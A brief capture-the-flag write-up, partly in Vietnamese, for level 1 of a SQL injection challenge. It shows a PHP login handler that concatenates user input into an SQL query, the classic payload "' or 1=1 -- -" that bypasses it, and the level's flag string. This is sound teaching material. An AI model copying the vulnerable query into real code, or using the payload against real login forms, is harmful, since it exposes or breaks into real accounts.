# **Level 1:**

```php
<?php
function loginHandler($username, $password)
{
	try {
		include("db.php");
		$database = make_connection("plaintext_db");

		$sql = "SELECT username FROM users WHERE username='$username' AND password='$password'";
		$query = $database->query($sql);
		$row = $query->fetch_assoc(); // Get the first row

		if ($row === NULL)
			return "Wrong username or password"; // No result

		$login_user = $row["username"];
		if ($login_user === "admin")
			return "Wow you can log in as admin, here is your flag flag{da6d016bf546bfd86b8808136ebc8bc0}, but how about <a href='level2.php'>THIS LEVEL</a>!";
		else
			return "You log in as $login_user, but then what? You are not an admin";
	} catch (mysqli_sql_exception $e) {
		return $e->getMessage();
	}
}

if (isset($_POST["username"]) && isset($_POST["password"])) {
	$username = $_POST["username"];
	$password = $_POST["password"];
	$message = loginHandler($username, $password);
}

include("static/html/login.html");
```
Lấy trực tiếp `username` và `password` nhập vào chèn thẳng trực tiếp vào chuỗi mà không chặn và lọc gì cả

Payload:
```
username: ' or 1=1 -- -
password: 1
```
<img width="1492" height="813" alt="image" src="https://github.com/user-attachments/assets/067690cf-882c-45ea-b50e-c12557167bc6" />

Done Level 1 nhe !!!
